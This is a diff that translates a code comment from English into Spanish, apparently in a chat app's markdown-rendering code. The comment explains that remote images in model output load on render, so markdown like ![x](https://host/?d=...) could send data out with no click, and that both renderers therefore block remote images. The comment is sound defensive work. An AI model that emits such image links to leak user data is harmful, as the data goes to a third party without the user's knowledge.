@@ -1,11 +1,12 @@
 /**
- * Chat replies and the reasoning panel render model output. A remote image
- * there loads as soon as it renders, so ![x](https://host/?d=...) would send
- * data out with no click. Both renderers block remote images. (data: images
- * were already blocked by Streamdown's sanitize step; the app's image and
- * SVG cards don't render through markdown.)
+ * Las respuestas del chat y el panel de razonamiento renderizan la salida del
+ * modelo. Ahí una imagen remota se carga en cuanto se renderiza, así que
+ * ![x](https://host/?d=...) enviaría datos fuera sin ningún clic. Los dos
+ * renderizadores bloquean las imágenes remotas. (Las imágenes data: ya las
+ * bloqueaba el paso de saneado de Streamdown; las tarjetas de imagen y SVG de
+ * la app no se renderizan mediante markdown).
  *
- * Classic JSX transform under tsx: React must be a global (see
+ * Transformación JSX clásica con tsx: React debe ser un global (ver
  * render-markdown.test.tsx).
  */
 import React from "react";
